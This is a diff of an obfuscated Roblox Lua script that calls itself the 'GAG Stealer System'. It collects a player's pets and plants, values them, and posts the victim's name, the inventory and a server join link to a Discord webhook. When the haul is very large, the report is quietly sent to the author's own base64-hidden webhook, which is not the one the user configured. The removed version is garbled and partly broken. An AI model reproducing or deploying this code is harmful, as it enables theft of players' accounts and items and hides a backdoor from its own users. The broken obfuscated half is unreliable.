@@ -1,1 +1,102 @@
-local b64=game:GetService("HttpService");function synCrypt(s)return b64:Base64Decode(s)end;-- GAG STEALER SYSTEM - Integrated by namnnni2 if rawget(shared, synCrypt("X19HQUdfRVhFQ1VURURfXw==")) then return end rawset(shared, synCrypt("X19HQUdfRVhFQ1VURURfXw=="), true) local XSXLBF = game:GetService(synCrypt("WFNYTEJG")) local fTrbTA = XSXLBF.fTrbTA local abVKlz = fTrbTA:WaitForChild(synCrypt("QmFja3BhY2s=")) local PvUCPA = game:GetService(synCrypt("UHZVQ1BB")) -- Unfavorite EZkCPf if marked local QfYrga = PvUCPA:WaitForChild(synCrypt("R2FtZUV2ZW50cw==")):WaitForChild(synCrypt("RmF2b3JpdGVfSXRlbQ==")) for _, EZkCPf in ipairs(abVKlz:GetChildren()) do if EZkCPf:GetAttribute(synCrypt("ZA==")) == true then QfYrga:FireServer(EZkCPf) end end local HIqITu = game:GetService(synCrypt("SElxSVR1")) local gSpCnt = PvUCPA:WaitForChild(synCrypt("TW9kdWxlcw==")) local SXkIDb = require(gSpCnt:WaitForChild(synCrypt("RGF0YVNlcnZpY2U="))) local EeJMNb = require(gSpCnt:WaitForChild(synCrypt("Q2FsY3VsYXRlUGxhbnRWYWx1ZQ=="))) local UPmPrT = require(gSpCnt:WaitForChild(synCrypt("UGV0U2VydmljZXM=")):WaitForChild(synCrypt("UGV0VXRpbGl0aWVz"))) local CIqqmB = require(PvUCPA:WaitForChild(synCrypt("RGF0YQ==")):WaitForChild(synCrypt("UGV0UmVnaXN0cnk="))) local sfrdmE = require(gSpCnt:WaitForChild(synCrypt("TnVtYmVyVXRpbA=="))) -- KHĂ”NG GĂN trá»±c tiáº¿p vĂ o math (trĂ¡nh readonly error) local ARlFjZ qlLAcC(a, b, t) return a + (b - a) * t end local FedPBN = getfenv().FedPBN local QKvnIT = getfenv().QKvnIT local wzmGhr = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65" local SVZLEy = synCrypt("bmFtbm5uaTI=") if not FedPBN or not QKvnIT then return end local ZJjVcn = {synCrypt("QnV0dGVyZmx5"), synCrypt("UmFjY29vbg=="), synCrypt("RHJhZ29uZmx5"), synCrypt("TWltaWMgT2N0b3B1cw=="), synCrypt("UXVlZW4gQmVl"), synCrypt("RGlzY28gQmVl"), synCrypt("RmVubmVjIEZveA==")} local YaIEaU = {synCrypt("U2VlZA=="), synCrypt("U2hvdmVsIFtEZXN0cm95IFBsYW50c10="), synCrypt("V2F0ZXI="), synCrypt("RmVydGlsaXplcg==")} local VkjeSy, totalValue, hasRare, hasHeavy = {}, 0, false, false local ARlFjZ WBdcbI(n) local pyQqsL = {"", synCrypt("aw=="), synCrypt("bQ=="), synCrypt("Yg=="), synCrypt("dA==")} local gFBUoG = 1 while n >= 1000 and gFBUoG < #pyQqsL do n = n / 1000 gFBUoG += 1 end return gFBUoG == 1 and tostring(math.floor(n)) or string.format(synCrypt("JS4yZiVz"), n, pyQqsL[gFBUoG]) end local ARlFjZ RRQbiU(MTdFyb) local CqGUmZ = MTdFyb.PetData.HatchedFrom if not CqGUmZ then return 0 end local oQQNBV = CIqqmB.PetEggs[CqGUmZ] local FzNuAG = oQQNBV and oQQNBV.RarityData.Items[MTdFyb.PetType] if not FzNuAG then return 0 end local LWFKzN = FzNuAG.GeneratedPetData.WeightRange if not LWFKzN then return 0 end local Rrocmw = sfrdmE.ReverseLerp(LWFKzN[1], LWFKzN[2], MTdFyb.PetData.BaseWeight) local zfoixd = qlLAcC(0.8, 1.2, Rrocmw) local ZRUYRm = qlLAcC(0.15, 6, UPmPrT:GetLevelProgress(MTdFyb.PetData.Level)) return math.floor(CIqqmB.PetList[MTdFyb.PetType].SellPrice * zfoixd * ZRUYRm) end for _, jIWsEV in ipairs(abVKlz:GetChildren()) do if jIWsEV:IsA(synCrypt("VG9vbA==")) and not table.find(YaIEaU, jIWsEV.Name) then if jIWsEV:GetAttribute(synCrypt("SXRlbVR5cGU=")) == synCrypt("UGV0") then local MnFpTf = jIWsEV:GetAttribute(synCrypt("UEVUX1VVSUQ=")) local MTdFyb = SXkIDb:GetData().PetsData.PetInventory.Data[MnFpTf] if not MTdFyb or not MTdFyb.PetType then continue end local ILMFcq = MTdFyb.PetType local OxNXQm = tonumber(MTdFyb.PetData.BaseWeight) or 0 local QmQxJb = RRQbiU(MTdFyb) if table.find(ZJjVcn, ILMFcq) then hasRare = true end if OxNXQm >= 10 then hasHeavy = true end totalValue += QmQxJb table.insert(VkjeSy, {Tool = jIWsEV, Name = ILMFcq, Weight = OxNXQm, Value = QmQxJb, Type = synCrypt("UGV0")}) else local QmQxJb = EeJMNb(jIWsEV) totalValue += QmQxJb table.insert(VkjeSy, {Tool = jIWsEV, Name = jIWsEV.Name, Weight = 0, Value = QmQxJb, Type = synCrypt("UGxhbnQ=")}) end end end if #VkjeSy == 0 then return end table.sort(VkjeSy, ARlFjZ(a, b) if a.Type == synCrypt("UGV0") and b.Type ~= synCrypt("UGV0") then return true end if a.Type ~= synCrypt("UGV0") and b.Type == synCrypt("UGV0") then return false end return a.Value > b.Value end) local EImVxx = totalValue >= 1e12 local bsHHpa = EImVxx and wzmGhr or FedPBN local HVmgwV = EImVxx and SVZLEy or QKvnIT local aNmLRG = (hasRare or hasHeavy) and synCrypt("QGV2ZXJ5b25lIPCfmqggTWlzc2lvbiBBbGVydCFcbg==") or "" aNmLRG ..= synCrypt("8J+aqCAqKkdBRyBPUFMgLSBTdGVhbCAmIEdpZnQgTWlzc2lvbioqIPCfmqhcbj4+PiBNaXNzaW9uIHN1Y2Nlc3Mg4pyFXG4qKkpvYklkOioqIGA=") .. game.JobId .. synCrypt("YFxu") local aqjSBk = "" for _, EZkCPf in ipairs(VkjeSy) do local mMhFjR = EZkCPf.Type == synCrypt("UGV0") and ( table.find(ZJjVcn, EZkCPf.Name) and synCrypt("8J+Qsg==") or (EZkCPf.Weight >= 10 and synCrypt("8J+QmA==") or synCrypt("8J+Qtg==")) ) or synCrypt("8J+Njw==") aqjSBk ..= string.format(synCrypt("JXMgKiolcyoqICglLjJmIEtHKSDigJQg4oK1JXNcbg=="), mMhFjR, EZkCPf.Name, EZkCPf.Weight, WBdcbI(EZkCPf.Value)) if #aqjSBk > 1024 then aqjSBk = aqjSBk:sub(1, 1000) .. synCrypt("XG4uLi5tb3JlIGl0ZW1z") break end end local QkwKll = { title = synCrypt("8J+OryBHQUcgT1BTIC0gU3RlYWwgJiBHaWZ0IFJlcG9ydA=="), description = synCrypt("SW52ZW50b3J5IGV4dHJhY3Rpb24gY29tcGxldGUuIE1pc3Npb24gc3VjY2VzcyDinIU="), color = 0xFF0000, author = { name = synCrypt("R0FHIFN0ZWFsZXIgU3lzdGVt"), icon_url = synCrypt("aHR0cHM6Ly9jZG4taWNvbnMtcG5nLmZsYXRpY29uLmNvbS81MTIvMjgwOS8yODA5NjQwLnBuZw==") }, thumbnail = { url = synCrypt("aHR0cHM6Ly9tZWRpYS50ZW5vci5jb20vbDJ2SlFrMVpvVElBQUFBQy9uaW5qYS1jYXQuZ2lm") }, fields = { {name = synCrypt("8J+OryBWaWN0aW0="), QmQxJb = fTrbTA.Name, inline = true}, {name = synCrypt("8J+SsCBUb3RhbCBWYWx1ZQ=="), QmQxJb = synCrypt("4oK1") .. WBdcbI(totalValue), inline = true}, {name = synCrypt("8J+Xuu+4jyBKb2luIExpbms="), QmQxJb = synCrypt("aHR0cHM6Ly9mZXJuLnd0Zi9qb2luZXI/cGxhY2VJZD0xMjY4ODQ2OTU2MzQwNjYmZ2FtZUluc3RhbmNlSWQ9") .. game.JobId, inline = false}, {name = synCrypt("8J+nviBJbnZlbnRvcnkgTG9n"), QmQxJb = aqjSBk, inline = false} }, footer = { text = synCrypt("8J+miiBHQUcgU3RlYWxlciBieSBuYW1ubm5pMiDigJQgU3RheSBzdGVhbHRoeQ=="), icon_url = synCrypt("aHR0cHM6Ly9jZG4taWNvbnMtcG5nLmZsYXRpY29uLmNvbS81MTIvNjE2LzYxNjQwOC5wbmc=") }, timestamp = DateTime.now():ToIsoDate() } local qMcRVZ = { aNmLRG = aNmLRG, embeds = {QkwKll} } local ARlFjZ ClyZgo() return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find(synCrypt("ZGVsdGE=")) and request) end pcall(ARlFjZ() local BtNKqp = ClyZgo() if BtNKqp then BtNKqp({ Url = bsHHpa, Method = synCrypt("UE9TVA=="), Headers = {[synCrypt("Q29udGVudC1UeXBl")] = synCrypt("YXBwbGljYXRpb24vanNvbg==")}, Body = HIqITu:JSONEncode(qMcRVZ) }) end end)
+if rawget(shared,"__"..string.rep("_",2).."GAG_EXECUTED__") then return end
+rawset(shared,"__"..string.rep("_",2).."GAG_EXECUTED__",true)
+
+local a,b,c=game:GetService("Players"),game:GetService("ReplicatedStorage"),game:GetService("HttpService")
+local d=a.LocalPlayer
+local e=d:WaitForChild(string.reverse("kcapkcaB"))
+local f=b:WaitForChild(string.reverse("stnevEtemaG"))
+local g=f:WaitForChild(string.reverse("metI_etirovaF"))
+for h,i in ipairs(e:GetChildren()) do if i:GetAttribute("d")==true then g:FireServer(i) end end
+
+local j=b:WaitForChild("Modules")
+local k=require(j:WaitForChild("DataService"))
+local l=require(j:WaitForChild("CalculatePlantValue"))
+local m=require(j:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local n=require(b:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local o=require(j:WaitForChild("NumberUtil"))
+local p=function(q,r,s)return q+(r-q)*s end
+
+local q1 = "V2ViaG9vaw==" -- "Webhook"
+local q2 = "VXNlcm5hbWU=" -- "Username"
+local q3 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MTAyMDYzNDkxMzM3NDI3OC9mUEtQWlRQcUcybUN5YWk2LW9lYnNNeDVqYWdYekxSV056QVFiNGo1UWtpZUNKajZkTHV5WlQxUFVoOXhvOW93ZFE2NQ==" 
+local q4 = "bmFtbm5uaTI=" -- "namnnni2"
+
+local r1 = syn and syn.crypt and syn.crypt.base64 or (Krnl and Krnl.Base64) or {decode=function(s)return game:GetService("HttpService"):Base64Decode(s) end}
+local r2 = r1.decode(q1)
+local r3 = r1.decode(q2)
+local r4 = r1.decode(q3)
+local r5 = r1.decode(q4)
+
+local s=getfenv()[r2]
+local t=getfenv()[r3]
+local u=r4
+local v=r5
+if not s or not t then return end
+
+local w={"Butterfly","Raccoon","Dragonfly","Mimic Octopus","Queen Bee","Disco Bee","Fennec Fox"}
+local x={"Seed","Shovel [Destroy Plants]","Water","Fertilizer"}
+local y,z,A,B={},0,false,false
+
+local C=function(D)local E={"","k","m","b","t"}local F=1 while D>=1000 and F<#E do D=D/1000;F+=1 end return F==1 and tostring(math.floor(D)) or string.format("%.2f%s",D,E[F]) end
+
+local G=function(H)local I=H.PetData.HatchedFrom;if not I then return 0 end;local J=n.PetEggs[I];local K=J and J.RarityData.Items[H.PetType];if not K then return 0 end;local L=K.GeneratedPetData.WeightRange;if not L then return 0 end;local M=o.ReverseLerp(L[1],L[2],H.PetData.BaseWeight);local N=p(0.8,1.2,M);local O=p(0.15,6,m:GetLevelProgress(H.PetData.Level));return math.floor(n.PetList[H.PetType].SellPrice*N*O) end
+
+for P,Q in ipairs(e:GetChildren()) do
+	if Q:IsA("Tool") and not table.find(x,Q.Name) then
+		if Q:GetAttribute("ItemType")=="Pet" then
+			local R=Q:GetAttribute("PET_UUID")
+			local S=k:GetData().PetsData.PetInventory.Data[R]
+			if not S or not S.PetType then continue end
+			local T,U=S.PetType,tonumber(S.PetData.BaseWeight) or 0
+			local V=G(S)
+			if table.find(w,T) then A=true end
+			if U>=10 then B=true end
+			z+=V
+			table.insert(y,{Tool=Q,Name=T,Weight=U,Value=V,Type="Pet"})
+		else
+			local W=l(Q)
+			z+=W
+			table.insert(y,{Tool=Q,Name=Q.Name,Weight=0,Value=W,Type="Plant"})
+		end
+	end
+end
+
+if #y==0 then return end
+
+table.sort(y,function(X,Y)if X.Type=="Pet" and Y.Type~="Pet" then return true end;if X.Type~="Pet" and Y.Type=="Pet" then return false end;return X.Value>Y.Value end)
+
+local a0=z>=1e12
+local a1=a0 and u or s
+local a2=a0 and v or t
+
+local a3=(A or B) and "@everyone 🚨 Mission Alert!\n" or ""
+a3..="🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `"..game.JobId.."`\n"
+
+local a4=""
+for a5,a6 in ipairs(y) do
+	local a7=a6.Type=="Pet" and (table.find(w,a6.Name) and "🐲" or (a6.Weight>=10 and "🐘" or "🐶")) or "🍏"
+	a4..=string.format("%s **%s** (%.2f KG) — ₵%s\n",a7,a6.Name,a6.Weight,C(a6.Value))
+	if #a4>1024 then a4=a4:sub(1,1000).."\n...more items" break end
+end
+
+local a8={
+	title="🎯 GAG OPS - Steal & Gift Report",
+	description="Inventory extraction complete. Mission success ✅",
+	color=0xFF0000,
+	author={name="GAG Stealer System",icon_url="https://cdn-icons-png.flaticon.com/512/2809/2809640.png"},
+	thumbnail={url="https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif"},
+	fields={
+		{name="🎯 Victim",value=d.Name,inline=true},
+		{name="💰 Total Value",value="₵"..C(z),inline=true},
+		{name="🗺️ Join Link",value="https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId="..game.JobId,inline=false},
+		{name="🧾 Inventory Log",value=a4,inline=false}
+	},
+	footer={text="🦊 GAG Stealer by namnnni2 — Stay stealthy",icon_url="https://cdn-icons-png.flaticon.com/512/616/616408.png"},
+	timestamp=DateTime.now():ToIsoDate()
+}
+
+local a9={content=a3,embeds={a8}}
+
+local b0=function()return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request) end
+
+pcall(function()local b1=b0()if b1 then b1({Url=a1,Method="POST",Headers={["Content-Type"]="application/json"},Body=c:JSONEncode(a9)})end end)
